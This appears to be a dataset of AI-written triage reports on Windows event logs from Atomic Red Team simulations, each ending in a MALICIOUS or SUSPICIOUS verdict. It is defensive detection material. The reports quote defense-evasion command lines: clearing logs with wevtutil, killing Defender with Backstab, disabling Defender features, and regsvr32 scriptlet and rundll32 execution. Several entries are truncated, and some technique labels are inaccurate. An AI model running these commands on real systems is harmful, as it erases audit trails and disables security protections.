   - There are multiple PowerShell executions with encoded commands (e.g., `powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdA==`) which translates from Base64 to a command that appears benign in this case (""Write-Host ""Hey, Atomic!""). However, the use of encoded PowerShell commands can often be an indicator of malicious intent, as attackers frequently use encoded commands to obfuscate their activities.

3. **Use of wevtutil.exe**:
   - The tool `wevtutil.exe` is used frequently throughout the logs to clear logs such as ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"" and ""Windows PowerShell"". While `wevtutil` is a legitimate Windows utility for managing event logs, its repeated use to clear logs is suspicious.

**Signs of Potential Compromise**

- The combined usage of `wevtutil.exe` in conjunction with the clearing of multiple logs and execution of encoded PowerShell commands suggests the possibility of malicious activity aimed at covering tracks.
  
- The actions correlate with techniques often used in post-exploitation phases to avoid detection and retain persistence.

**Assessment and Resolution**

Based on the pattern of behavior observed in these logs—which includes repeated clearing of multiple system logs, execution of encoded commands, and high-integrity processes being spawned—there is strong evidence pointing towards potential malicious activity. The clearing of event logs, in particular, is a strong indicator of intent to obscure malicious behavior.

**Resolution: MALICIOUS**

**Guidance on How to Proceed**

User scope COR_PROFILER,"### Detailed Analysis of the Logs:

#### 1. PowerShell Log Analysis:
- The PowerShell logs indicate the execution of a script with the following behaviors:
  - Creation of a registry key in the `HKCU:Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}` path.
  - Setting environment variables related to .NET Profiling (`COR_ENABLE_PROFILING`, `COR_PROFILER`, and `COR_PROFILER_PATH`) pointing to a DLL in the `AppData\Local\Temp\AtomicRedTeam` directory.
  - Launching `eventvwr.msc`, which is a known technique (T1218.011) for potentially bypassing User Account Control (UAC).

#### 2. System Log Analysis:
- The system log indicates that log files were cleared by the user `admin_test`. Clearing log files is a classic indicator of an attempt to cover tracks post-compromise.

#### 3. Security Log Analysis:
- Similar to the system log, the security log shows that the log files were also cleared by `admin_test`. This further solidifies the intention to cover malicious activities.

#### 4. Sysmon Log Analysis:
- There are multiple events showing the use of `wevtutil.exe` to clear logs across different channels (`Sysmon/Operational`, `Application`, `System`, and `Security`), executed by the `admin_test` user.
- Observing the execution of these commands with high integrity level (`IntegrityLevel"":""High""`) indicates an attempt to manipulate or erase event logs to cover illicit actions.
- The PowerShell process executed belongs to `admin_test`, further aligning with actions seen in previous logs and corroborated by Sysmon logs. PowerShell executes suspicious registry key modifications and launches suspicious processes.

### Assessment and Conclusion:
- The described behaviors suggest a sophisticated attempt to bypass security controls and execute potentially harmful scripts with persistence and privilege escalation intentions.
- Actions like registry modifications to load malicious DLLs, launching event viewers to possibly bypass UAC, and the consistent effort to erase log files strongly point toward a compromise.

### Threats or Risks Identified:
- Possible persistence mechanism via malicious DLL inserted in registry and activated through environment variables.
- Log clearing suggests an attempt to erase traces of actions, which is indicative of post-exploitation actions.

### Guidance on How to Proceed:
- Immediate containment of the affected system (Server002) to prevent further actions.
- A thorough network sweep to identify other potentially compromised hosts.
- In-depth investigation of user `admin_test` activities across the network.
- Audit and review active directory for unusual group membership or login activities associated with `admin_test`.
- Conduct a review and strengthening of PowerShell script logging and monitoring policies.

### Final Resolution:
- **MALICIOUS** - The behaviors observed in the logs are consistent with known malicious patterns, specifically circumventing security controls and clearing logs to cover tracks."
Disable Windows IIS HTTP Logging,"After analyzing the provided logs, there are several points of interest that deserve attention:

1. **PowerShell Activity**:
   - There is a record of PowerShell executing an application command (`appcmd.exe`) that modifies the IIS logging settings for ""Default Web Site"" to not log traffic (`/dontLog:true`). This action could be an attempt to cover up malicious activity or hide specific web requests from being recorded. The alteration of logging settings is a suspicious activity and can be indicative of an attempt to conceal malicious actions.

2. **Event Log Clearing**:
   - The logs indicate that the event logs (System, Security, and Windows PowerShell) were cleared by the user ""admin_test"". This activity is highly suspicious, as clearing event logs is a common tactic used by attackers to cover their tracks and remove evidence of their presence on a system.

3. **Unusual Command Usage**:
   - While tools like `hostname.exe`, `whoami.exe`, `wevtutil.exe`, and system update processes are typically benign, their usage in sequence, especially following changes to logging settings and event log clearing, adds to the suspicion. The use of `wevtutil.exe` for log management can be benign in administrative activities but is suspicious in this context due to the presence of other indicative behaviors.

4. **Network and System Updates**:
   - There are multiple entries related to the Microsoft Edge Update process running under `NT AUTHORITY\SYSTEM`. While this can be part of regular system maintenance, the volume of these operations and their timing concurrent with suspicious PowerShell and log-clearing activities raises concerns about potential misuse or manipulation.

5. **Time Event Manipulation**:
   - There are events where system time was manipulated, although this might be part of Windows time synchronization service activity. However, in the context of other suspicious activities, it should be further reviewed.

6. **High Integrity Level**:
   - Most operations are running with a high integrity level, which means they are executing with elevated privileges, increasing the potential for impact if these are indeed malicious actions.

Given these observations, the behavior observed in these logs is indicative of potential malicious activity or at least requires further investigation due to the signs of attempted log concealment and configuration manipulation. Specifically, the PowerShell session changing IIS logging settings, subsequent clearing of event logs, and multiple high-privilege activities need thorough examination.

**Resolution: SUSPICIOUS**

**Guidance on how to proceed**:
- Isolate the affected system to prevent further potential compromise.
- Conduct a thorough forensic investigation on the machine to check for additional indicators of compromise (IOCs).
- Review all user accounts and their privileges, especially any changes on ""admin_test.""
- Restore normal logging settings and ensure logs are being recorded and stored externally for ongoing monitoring.
- Consider using security solutions like SIEM to detect similar patterns in the network.
- Communicate with the IT team to confirm any legitimate administrative tasks that might have induced similar system behaviors.
"
DLL Side-Loading using the Notepad++ GUP.exe binary,"### Detailed Analysis of Logs

Upon reviewing the provided Windows event logs, several points of interest stand out:

1. **Log Clearing Activity:**
   - The logs reveal multiple instances of the `wevtutil.exe` (Eventing Command Line Utility) clearing various event logs such as System, Security, and Windows PowerShell. Specific events include clearing logs for `Microsoft-Windows-Sysmon/Operational`. 
   - The `LogFileCleared` event (EventID 1102 in the Security log and EventID 104 in the System log) indicates that an admin_test user cleared these logs.
   - Clearing event logs is suspicious as it’s often done to cover tracks of other potentially malicious activities.

2. **Process Execution:**
   - The `Sysmon` log records multiple processes executed in rapid succession involving `wevtutil.exe` with command lines indicating log clearing (Event ID 1 for process creation).
   - These executions all show a high integrity level, indicating they were run with high privileges. High-frequency process creation with `wevtutil.exe` and corresponding `wevtutil cl` command lines are clear indications of efforts to delete evidence.

3. **Process Parentage:**
   - The parent process of many suspicious executions is `wsmprovhost.exe`, indicating script or remote management activity.
   - Additionally, a cmd.exe process executed with a path to a known red teaming tool (Atomic Red Team - GUP.exe) within a temporary directory evidences a simulation of malicious behavior consistent with threat actor techniques.
   
4. **Other Processes:**
   - Traditional Windows administrative and auxiliary tools like `whoami.exe` and `hostname.exe` executed without apparent valid intent, often used to gather environment information for lateral movement or process validation.

5. **Benign Activity:**
   - The `Microsoft Edge Update` processes appear to be routine updates due to the scheduled task execution observed in processes running under NT AUTHORITY\SYSTEM.

### Assessment of Situation

Based on the observed behavioral patterns in the logs, there are clear indicators of:
- **Log Clearing Activities:** Essential system and security logs were cleared by a seemingly unauthorized user, which is a common tactic used to hide malicious activities.
- **Utilization of Known Red Team Tools:** The execution of a GUP.exe under paths aligned with Atomic Red Team usage indicates potentially authorized simulation exercises or practice by an unnoted red team or adversarial actors obtaining access.
- **High Privileges Process Execution:** Most of the processes were running with high integrity indicating administrative permissions which, if not usual, could denote attempts of privilege escalation.

### Threat or Risks Identified

The combination of event log clearing, execution of a known red-teaming executable nearly simultaneously, and high integrity process execution poses significant risks of malicious activity. If the activity isn't accounted for as part of an internal security exercise, it should be considered potentially damaging.

### Guidance on How to Proceed

1. **Immediate Steps:**
   - Confirm if there were planned red team exercises or other authorized actions involving the activity indicated in the logs.

Disable Windows Defender with PwSh Disable-WindowsOptionalFeature,"Upon analyzing the provided Windows event logs, the following observations were made, indicating potentially malicious behavior on the server:

1. **Event Log Clearing**:
   - The security, system, and Windows PowerShell logs were cleared by the user ""admin_test"" almost simultaneously around ""2024-10-28 09:53:20"". This is generally considered suspicious behavior, often associated with covering tracks of unauthorized or malicious activity. The use of ""wevtutil"" commands to clear logs is typical for attackers attempting to remove evidence.

2. **PowerShell Activity**:
   - There were multiple PowerShell executions involving the `Disable-WindowsOptionalFeature` command to disable Windows Defender features (GUI, Application Guard, etc.) without a restart, with an `-ErrorAction Ignore` parameter. Attempting to disable built-in security features like Windows Defender is a red flag, often indicating an effort to weaken system security for further exploitation.

3. **Sysmon Logs**:
   - The Sysmon logs show numerous executions of the ""wevtutil.exe"" process to clear event logs, reflecting the aforementioned event log clearing activity. The use of PowerShell scripts indicates automated task execution.
   - Additionally, there was extensive activity related to the Microsoft Edge Update service. This could be a normal software update process unless the Edge update executables were leveraged by malicious software to masquerade activities, which is commonly observed in supply chain attacks.

4. **DismHost.exe Execution**:
   - Multiple instances of ""DismHost.exe"" were run from temporary directories. While ""DismHost"" is a legitimate Windows process used for servicing Windows images, execution from unusual directories can suggest masquerading or tampering. However, without further evidence, this might also be associated with normal system activities or updates.

5. **Context and Timing**:
   - The combination of disabling security tools, clearing logs to hide activities, and executing multiple potentially benign processes in a manner typical for malware execution chains strongly indicates malicious intent.

### Assessment
The observed behavior within the logs can be classified as:

- **MALICIOUS**: The combination of clearing system security logs, disabling Windows security features, and executing potentially malicious processes signifies clear malicious activity. This strongly indicates a security breach with potential unauthorized access or exploitation attempts on the system.

Kill antimalware protected processes using Backstab,"Upon analyzing the provided event logs, here is a detailed examination:

### Overview:
The logs primarily consist of Sysmon, System, Application, Windows PowerShell, and Security logs originating from `Server002`. The Sysmon logs indicate various process creations and terminations, and there are events related to clearing logs which are typically sensitive actions.

### Observations:

1. **Process Executions**:
   - **PowerShell Commands (EventID 1, Sysmon Log)**:
     A PowerShell instance was executed using a command that involves a suspicious script: `""powershell.exe"" & {& \""""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\\ExternalPayloads\\Backstab64.exe\"""" -k -n MsMpEng.exe}`. This suggests execution of a potentially malicious payload located in an unusual path (`ExternalPayloads\\Backstab64.exe`).
   
2. **Use of Windows Events Utility**:
   - Several instances of `wevtutil.exe` (Windows Event Utility) are seen running and clearing event logs:
     - Clearing of `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security` logs. (EventID 104 in System and EventID 1102 in Security).
     - Clearing of logs is a strong indicator of potentially malicious behavior, as it can be used to cover tracks post-compromise.
   
3. **Use of Administrative Tools**:
   - Tools like `wevtutil.exe`, `whoami.exe`, and `hostname.exe` have been executed, indicating potential system reconnaissance or scripting/automation. These actions themselves are normal but become suspicious when combined with other context such as clearing of logs and execution of suspicious scripts.

4. **Edge Update Activity**:
   - The frequent executions of `MicrosoftEdgeUpdate.exe` seem to be normal updates, continuing without any apparent issue.

5. **Log Clearance**:
   - The logs show multiple instances of log clearance by the user `admin_test`, which is anomalous. Log clearance is often associated with post-compromise activities by attackers trying to erase traces.
   
6. **Security Software**:
   - Security applications such as Windows Defender were seen to be running (Application log, Event IDs 15). Their presence is not alarming, but their functionality should be verified in the incident context.

### Assessment:

Based on the above observations, particularly the execution of a suspicious PowerShell script seemingly launching a potential malware payload and the deliberate clearing of logs, the activities in the logs exhibit distinct indicators of malicious behavior.

### Conclusion:

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Containment**:
   - Isolate `Server002` from the network to prevent any lateral movement or further compromise.

Execution of non-dll using rundll32.exe,"Upon reviewing the provided logs, several indicators of potentially malicious activity have been identified. Here is a detailed analysis:

### System Log Observations:
1. **Event ID 104:** Multiple system logs and specific channel logs (Windows PowerShell) were cleared by the user ""admin_test."" The clearing of logs, especially without backup, is a typical indicator of an attempt to cover tracks in post-compromise scenarios.
   
### Application Log Observations:
1. **Edge Update Events:** The Edge Update service repeatedly started and stopped in a short time span, although this is more likely to be benign as part of an update process.

### Windows PowerShell Log Observations:
1. **Event ID 600:** The command `rundll32.exe C:\\Users\\$env:username\\Downloads\\calc.png, StartW` appears suspicious. Executing a `png` file as a DLL, using `rundll32.exe`, is uncharacteristic of legitimate usage and suggests code execution masked under a non-executable file format.

### Sysmon Log Observations:
1. **Events 1 and 5:** Several instances of processes being spawned from paths that include Edge and generic Windows processes. The running of `rundll32.exe` with an image file as a script (`calc.png`) is a clear attempt at executing potentially malicious code.
2. **Log Clearing:** Under user ""admin_test,"" with a high integrity level, the process `wevtutil.exe` was used to clear logs across multiple channels. This further corroborates the attempt to erase activity traces.

3. **Creation of PowerShell and Rundll32 Processes:** The process creation involving `rundll32.exe` to ostensibly invoke code execution from an image file is highly anomalous and likely malicious. This is a common technique for attackers to bypass security mechanisms by executing malicious code in-memory instead of writing it to disk.

### Security Log Observations:
1. **Event ID 1102:** The Security log itself was cleared, aligning with attempts at trace covering post-compromise.
2. **Event ID 4672:** Privileged logon was observed for the SYSTEM account, which may indicate actions requiring elevated permissions possibly linked to the aforementioned activities.

### Assessment:
The logs present clear indicators of potentially malicious activities, especially focusing on log clearing and suspicious process executions using commonly exploited binaries like `rundll32.exe`. The combination of log clearing without justification and the suspicious PowerShell command execution strongly suggests this activity is malicious.

### Resolution: MALICIOUS

Given these observations and analysis, the activity recorded in the logs is identified as malicious. Immediate actions are recommended to isolate the affected system, perform deeper forensic analysis, and begin incident response protocols to prevent further compromise and assess the impact. Additionally, monitoring and reviews should be instituted to detect similar activities across the network."
Activate Windows NoDesktop Group Policy Feature,"Upon reviewing the provided Windows event logs, the following observations and analyses have been made:

1. **Log Clearing Events:**
   - The System log and potentially other channels, such as Windows PowerShell and Sysmon, have been cleared by the user `admin_test`. This behavior is concerning as log clearing is a common tactic employed by malicious actors to cover their tracks after performing unauthorized actions on a system. These events are captured in multiple logs including logs with `EventID 104` (System) and `EventID 1102` (Security).

2. **Usage of Windows Utilities:**
   - The utility `wevtutil.exe` (Eventing Command Line Utility) has been repeatedly executed with the command to clear logs (`cl`) for various log channels, including Sysmon, Application, System, Security, and Windows PowerShell. This corroborates the log-clearing suspicion.

3. **Suspicious Registry Activity:**
   - A `cmd.exe` process executed a command to add a registry entry under `HKEY_CURRENT_USER` with the path `Software\Microsoft\Windows\CurrentVersion\Policies\Explorer` to set `NoDesktop` value. This registry modification is non-standard and could indicate an attempt to alter the desktop environment, potentially to render it unusable or to enforce specific policy restrictions for malicious purposes.

4. **Time Change Events:**
   - There are multiple `EventID 4616` entries indicating changes to the system time using `svchost.exe`. While these changes could be legitimate, frequent and unexplained time adjustments can also be utilized to bypass time-based detection mechanisms or logs' chronological order alterations.

5. **EdgeUpdate Activities:**
   - The Microsoft Edge Update-related events observed appear to be routine update processes executed under `NT AUTHORITY\SYSTEM`, suggesting they are system-initiated. These are less likely to be signs of malicious activity as they align with typical operations for software updates.

**Assessment:**
- The conspicuous activity related to log clearing by `admin_test`, coupled with suspicious registry modifications and multiple unexplained time changes, indicate potentially malicious behavior.

**Resolution: MALICIOUS**
- The actions identified are consistent with efforts to obfuscate unauthorized or malicious activities on the system, potentially indicating compromise. Further forensic analysis should be conducted to confirm these findings, including checking network traffic, other system logs not cleared, and system integrity. Inquiry should be directed toward user `admin_test` for clarification, and immediate actions should be taken to secure the environment, such as reviewing access permissions and strengthening logging and monitoring practices."
Windows Modify Show Compress Color And Info Tip Registry,"### Analysis of Logs:

1. **System Log:**
   - Event IDs 104 in the System log indicate that the event logs for both the System and Windows PowerShell channels were cleared by the user ""admin_test."" This activity is suspicious as clearing logs is often an indication of an attempt to cover up actions or activities.

2. **Sysmon Log:**
   - Multiple entries refer to the command `wevtutil.exe cl` which is used to clear event logs. This tool's execution is directly linked to activity by ""admin_test,"" evidenced by the fact that the parent process is always a Windows Management Instrumentation provider host.
   - The execution of the `cmd.exe` process with a command line involving registry modifications (related to Explorer settings) without a direct legitimate purpose is suspicious. Registry changes without proper context or apparent reason could be used to manipulate system behavior or cover tracks.
   - The process `whoami.exe` was executed which may indicate reconnaissance activity for identifying the currently logged-in user.
   
3. **Security Log:**
   - Event ID 1102 indicates the Security logs were cleared, again by ""admin_test."" This is aligned with previous log clearing activities and strengthens the suspicion of malicious behavior.

4. **Application Log:**
   - Entries mention ""Service stopped"" for ""edgeupdate,"" but these appear to be regular operational events related to Edge services and do not, by themselves, indicate suspicious activity.
   - Another event from ""Software Protection Platform Service"" does not show immediately suspicious activity and relates to regular licensing and protection tasks.

### Assessment:

The combination of these activities—especially the clearing of event logs across multiple channels (System, Security, and PowerShell)—indicates a potential attempt to hide actions. The use of legitimate tools (`wevtutil.exe`, `cmd.exe` with registry edits, `whoami.exe`) in this context suggests a user with elevated privileges performing activities that are typically part of an attack chain, possibly for reconnaissance followed by cleaning up traces.

### Resolution:

- **SUSPICIOUS**: The activities revealed in the logs, particularly the clearing of multiple log channels and suspicious registry modifications, indicate abnormal behavior that warrants further investigation. While there is no explicit evidence of malware, the patterns of activity suggest possible misuse of credentials or internal threat actor behavior.

### Guidance:

1. **Immediate Actions:**
   - Investigate the user ""admin_test"" for unusual activities or deviations from their typical profile.
   - Review other systems for similar log clearing activities.
   - Conduct a deep dive into endpoint detection and response (EDR) data on the affected host for any signs of further compromise.

2. **Further Investigation:**
   - Check for any recent software or policy changes that might explain the cleared logs or command executions.
   - Carefully review user access logs to validate credentials and ensure there are no unauthorized access patterns.

3. **Remediation:**
   - Consider enabling more stringent auditing policies to capture future event log clear activities.
   - Communicate with relevant personnel to ensure no legitimate administrative tasks are causing similar patterns."

1. **Clearing of Event Logs**:
   - Within the provided logs, several event logs (System, Security, and Windows PowerShell) are cleared by a user named `SERVER002\\admin_test`. Log clearing can often indicate an attempt to hide malicious activity or unauthorized access, as it removes records of past events that could be useful during forensic investigations.

2. **Execution of `wevtutil` and `whoami`**:
   - The `wevtutil` command was used multiple times (as evidenced by events 17960, 17964), specifically to clear logs (via `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational` and `wevtutil.exe cl Application`). 
   - The `whoami` command was executed, which by itself is not inherently malicious but can be indicative of an attacker gaining access and identifying their privileges on the system.

3. **Suspicious Command Execution**:
   - Event 17991 shows the execution of a suspicious command line involving `cmd.exe` and `rundll32.exe` to run a script (`rundll32 vbscript` followed by launching `calc.exe`). This technique is commonly associated with attempts to execute payloads or bypass traditional security controls using legitimate executables to execute malicious scripts, often referred to as ""Living off the Land"" tactics.

4. **Logon Events and Privilege Usage**:
   - Multiple logon events (Event IDs 4624) with high privilege rights, including those with logged elevated tokens, indicating administrative access was achieved or used during these operations (e.g., Event ID 4672 lists extensive privileges granted to `admin_test`).

5. **Time Manipulation**:
   - There are System events indicating potential time manipulation (Event ID 4616 – time change security auditing events), suggesting that the system time might have been altered, which can be used to throw off timelines in log analysis.

These elements combined depict a pattern that is commonly seen in post-exploitation activities where attackers attempt to escalate privileges, collect information, clear logs to remove traces, and execute payloads or gain persistent access.

**Resolution**: Given the presence of explicit log clearing, the use of system utilities in suspicious ways, execution of `rundll32` with a dubious command line, and potential time manipulation, the activity captured in these logs is best classified as **MALICIOUS**.

**Guidance**:
- Immediately conduct a thorough investigation into the user `admin_test` to determine the legitimacy of their actions, including whether credentials were compromised.
- Implement network segmentation and enhanced monitoring to detect anomalies faster.
- Retrieve and secure any backups of the event logs prior to their clearing for deeper analysis.
- Consider an incident response engagement to thoroughly understand the scope and impact of this activity.
- Enhance security education and monitoring for misuse of utilities like `whoami`, `wevtutil`, and `rundll32`. 
- Review and potentially restrict the use of high-privilege accounts and critical processes on high-value assets."
Invoke HTML Application - Jscript Engine Simulating Double Click,"### Detailed Analysis of Log Entries

#### Suspicious or Anomalous Behavior

1. **Presence of PowerShell Activity**:
   - PowerShell (`powershell.exe`) is frequently used in automation and legitimate administrative tasks, but it is also commonly leveraged by attackers for malicious activities. In the supplied logs, we see the execution of PowerShell with a specific script: `Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick`. The usage of custom scripts, especially ones that invoke HTA (HTML Application) files, is a red flag for potential malicious activity. HTA files are often used by attackers to execute scripts in a way that bypasses some security measures.

2. **Event Logging Modifications**:
   - There are multiple instances of `wevtutil.exe` being used to clear event logs (Event IDs 104 and 1102 for System, Security, and Windows PowerShell channels). This action is commonly associated with attackers attempting to cover their tracks after a compromise or unauthorized activity.

3. **High Integrity Level and Privileged User Execution**:
   - The logs show processes being executed with high integrity levels by the user `SERVER002\admin_test`. The account appears to have administrative privileges as indicated by the `IntegrityLevel` and `UserID`. The usage of administrative privileges to execute PowerShell and modify log records strengthens the suspicion.

4. **Clearing of Security, System, and Windows PowerShell Logs**:
   - This activity is indicative of an attempt to hide actions on the system. Legitimate users typically do not clear logs, especially in rapid succession with other potentially harmful activities.

#### Potential Indicators of Malicious Activity

- **HTA File Execution**: The command invoked through PowerShell attempts to run a script-engine file, commonly used in phishing and exploitation strategies.
- **Event Log Clearing**: Specific event logs (Sysmon IDs and native Event Logs) cleared soon after the execution of suspicious commands is a clear indicator of a potential cover-up.
- **Multiple related processes**: The rapid succession and execution of commands with little interval between them suggest automated execution, which is often seen in scripted attacks.

### Assessment of the Situation

Based on the detailed review of the logs, the activity appears anomalous and potentially indicative of a compromise:

- The clearing of logs immediately following the execution of PowerShell scripts commonly used in obfuscation or malicious scripting.
- The PowerShell command `Invoke-ATHHTMLApplication` with HTA is not typical in regular enterprise use unless verified for legitimate administrative purposes.

### Identified Threats or Risks

- Potential unauthorized access and use of PowerShell for malicious tasks.
- Attempted concealment of activities by clearing event logs.
- Possibility of further exploitation or lateral movement by a malicious actor within the network.

### Guidance on How to Proceed

1. **Immediate Containment**:
   - Isolate the affected machine, `Server002`, from the network to prevent potential lateral movement.

2. **Detailed Investigation**:
   - Conduct a forensic investigation on `Server002`. Specifically, examine HTA files and any other suspicious scripts or unauthorized scheduled tasks.
   - Review the user account `admin_test` for unauthorized access or activity.

3. **Monitoring and Logging**:
   - Enhance logging and monitoring for PowerShell scripts and ensure logging is not disabled on critical systems.
   - Review and potentially increase the monitoring of accounts with administrative privileges.

4. **Security Measures**:
   - Implement application whitelisting to prevent unauthorized scripts from executing.
   - Conduct a review of user privileges to ensure the principle of least privilege is adhered to.

### Final Resolution

**MALICIOUS** - The logs contain multiple indicators of potentially malicious activity, including unauthorized PowerShell execution, event log clearing, and usage of HTA files, all performed under a high-privilege user context."
Activate Windows NoClose Group Policy Feature,"After thoroughly reviewing the provided Windows event logs, several key points emerge that warrant attention:

1. **Event Log Clearing:**
   - The Security, System, and PowerShell logs have been cleared as indicated by event ID 1102 in the security log and event ID 104 in the system log. The user associated with these events is `admin_test` on `SERVER002`.

2. **Use of `wevtutil`:**
   - Multiple instances of the `wevtutil.exe` process are observed, used to clear event logs. This activity coincides with entries in the Sysmon log showing `wevtutil` was executed with command lines such as `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`.

3. **Time Manipulation:**
   - Time adjustment events (Event ID 4616) recorded in the Security log indicate that the system time was altered. The process responsible is `svchost.exe`, running under `LOCAL SERVICE`. However, this activity itself might suggest possible time-tampering attempts related to masking malicious activity timestamps.

4. **Registry Modification:**
   - The Sysmon logs show the execution of `cmd.exe` and `reg.exe` to modify Windows registry keys under `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`. The modification action corresponds to preventing the closure of the Windows Explorer interface, which is a known technique for maintaining persistence or creating user restrictions.

5. **Shell Execution:**
   - The logs indicate `cmd.exe` was used to execute a registry modification script. The command line arguments suggest a direct manipulation of system policies via `reg.exe`. This could be intended to alter various system behaviors.

6. **Edge Update Activity:**
   - Multiple legitimate Edge update processes are documented; however, they do not correlate directly to the suspicious activity described above, aside from possibly occurring due to timing. These are more likely routine updates unless further suspicious behaviors are detected in related logs.

### Assessment and Guidance:

The activities identified, including the clearing of event logs, potential time manipulation, and unauthorized registry changes, are strong indicators of malicious behavior. In particular:
- The clearing of logs is a significant red flag as it is often used to cover tracks following unauthorized access or malicious activities.
- The execution of registry commands to disable specific explorer behaviors further suggests attempts to maintain an undesired control over the system.

**Resolution: MALICIOUS**
Given these indicators, it is clear that the activity is malicious. Immediate actions should include:
- Isolating the affected system to prevent further compromise.
- Conducting a full forensic analysis to determine the extent of the breach.
- Reviewing and revoking credentials associated with the `admin_test` user, as they appear compromised.
- Reassessing the current security posture and implementing measures to prevent similar incidents, such as stricter access controls and enhanced monitoring."
Regsvr32 local COM scriptlet execution,"From the provided logs, several activities and behaviors stand out as suspicious and potentially malicious:

1. **Unusual Execution of Wevtutil and Log Clearance**:
   - There are multiple entries of `wevtutil.exe` processes with the command-line argument to clear logs, as seen with logs targeting the `Microsoft-Windows-Sysmon/Operational`, `Application`, `Security`, and `System` channels. Clearing logs is a common tactic used by attackers to cover their tracks.

2. **Execution of Regsvr32 with Scriptlet**:
   - The command `regsvr32.exe /s /u /i:""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.010\\src\\RegSvr32.sct"" scrobj.dll` suggests the use of Regsvr32 to execute a downloaded scriptlet file. This is a known ""Living off the Land"" binary (LOLBin) technique that can be used for executing arbitrary scripts, often used by adversaries for code execution without writing files to disk.

3. **Suspicious Process Chain**:
   - The process chain includes execution of `cmd.exe` from `wsmprovhost.exe`, launching `regsvr32.exe`, which is typically anomalous for normal operations and aligns with known attack patterns.

4. **Clearing of Event Logs**:
   - The logs indicate not only the execution of commands to clear specific Windows event logs but also successful log clearance events, which is indicative of malicious intent to erase evidence of processes and activities.

5. **Integrity Level and User Context**:
   - The activities are executed with a high integrity level by the user account `SERVER002\\admin_test`, suggesting that the account might have elevated privileges possibly enabling these malicious actions without obstruction.

**Assessment:**

The observed activities demonstrate a sequence of actions consistent with malicious behavior, including log clearing and the execution of potential attack scripts using system utilities in an attempt to evade detection and possibly conduct further operations on the system. Particularly concerning is the combination of log clearance alongside potential execution of scripts using Regsvr32, a method often used in sophisticated attacks to achieve persistence or remote code execution.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Actions:**
   - Isolate the affected host (Server002) from the network to prevent further action by any potential attacker.
   - Change passwords and review access controls for the affected and potentially compromised accounts, especially `admin_test`.

2. **Investigate Further:**
   - Perform a deeper forensic analysis on the host, looking for any additional indicators of compromise and to capture evidence.
   - Review other systems in the network for similar activities to assess the extent of the compromise.

3. **Strengthen Security Measures:**
   - Enhance logging and monitoring, ensure all relevant logs are being stored in a secure, off-host location to prevent tampering.
   - Review and enhance endpoint protection solutions to prevent the use of LOLBins for unauthorized actions.
   - Educate users about phishing and other tactics adversaries use to gain network access.

In conclusion, the pattern of activity strongly indicates malicious intent and requires prompt and thorough investigation to mitigate any further impact."
Command Execution with NirCmd,"Based on the logs provided, there are several indicators that suggest potentially malicious activity on the host:

### Suspicious Activities Identified:

1. **Event Log Clearing:**
   - Multiple instances of event log clearing are spotted:
     - Log files for the Security, System, and Windows PowerShell channels have been cleared (EventID 1102 and 104). 
     - This is typically indicative of log tampering or an attempt to cover tracks by an attacker.

2. **Unusual PowerShell Activity:**
   - There is evidence of PowerShell being executed with a command designed to manipulate the GUI (hiding the system tray clock using nircmd.exe). This is often associated with hiding malicious actions from the user.

3. **Wevtutil Execution:**
   - Several instances where `wevtutil.exe` is run to clear event logs (`CommandLine: ""C:\\Windows\\system32\\wevtutil.exe"" cl Security`), coincide with the log clearing events. The presence of this in conjunction with the cleared logs is highly suspicious.

4. **Presence of NirCmd Utility:**
   - The execution of `nircmd.exe`, typically used for legitimate purposes, may also be used in malicious scenarios to alter system settings and hide activity.
   - The execution is part of a script path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads`, which could imply the use of known security testing or offensive security tools.

5. **Privilege Escalation and PowerShell Execution with High Integrity:**
   - The use of high privileges along with the execution of PowerShell scripts with elevated permissions further adds to the suspicion.

6. **Credential Access and Multiple Failed Authentication Queries:**
   - Multiple EventID 5379 entries indicate attempts to access credential material (likely failed due to the ReturnCode 3221226021). This could indicate an attempt to access or enumerate credentials.

### Assessment and Resolution:

The combination of these activities suggests a significant level of unauthorized activity indicative of an attack in progress. The clearing of log files, the use of scripting and execution of potentially harmful commands with high integrity and hiding mechanisms, point strongly towards an attempt to obfuscate actions from detection.

**Resolution: MALICIOUS**   
The logs indicate potentially malicious activity. Immediate investigation is required to ascertain the full extent of the compromise, and appropriate incident response actions should be taken to mitigate any further risk.

DiskShadow Command Execution,"### Analysis of Windows Event Logs

Upon reviewing the logs provided, several events stand out that suggest potentially suspicious activity:

1. **Logs Clearing Events**:
    - **System Log**: EventID 104 indicates the clearing of the System and Windows PowerShell logs, performed by the user `admin_test`. Logs were cleared without a backup, which indicates an attempt to remove traces of actions carried out on the system.
    - **Security Log**: EventID 1102 shows that the security logs were cleared by the same user `admin_test`. Clearing the security logs is particularly concerning as it is often an attempt to destroy forensic evidence.

2. **Unusual PowerShell Activity**:
    - **Sysmon Log**: EventID 1 shows `powershell.exe` executed a command involving `diskshadow.exe`, using a script from a potentially temporary and manipulated directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218\src\T1218.txt`). The use of `diskshadow.exe` can be suspicious, particularly in the context of a penetration test or an attack, as it can help in persistence and privilege escalation activities.

3. **Use of `wevtutil.exe`**:
    - **Sysmon Log**: Several EventID 1 entries involve the execution of `wevtutil.exe` to clear event logs (`cl` parameter), which again correlates with attempts to hide system activity that is standard in post-exploitation scenarios.

4. **Overall Suspicious Command Execution**:
    - **Process Execution**: Throughout the logs, processes such as `whoami.exe` and `hostname.exe` were executed, potentially as part of enumeration activities typically performed after gaining access to a system to collect information about user privileges and system details.

5. **Administrative Account Activity**:
    - Actions were taken on the host using a high-integrity level, logged in by `SERVER002\admin_test`, an administrative user account. This could indicate misuse of administrative privileges.

6. **Atomic Red Team Reference**:
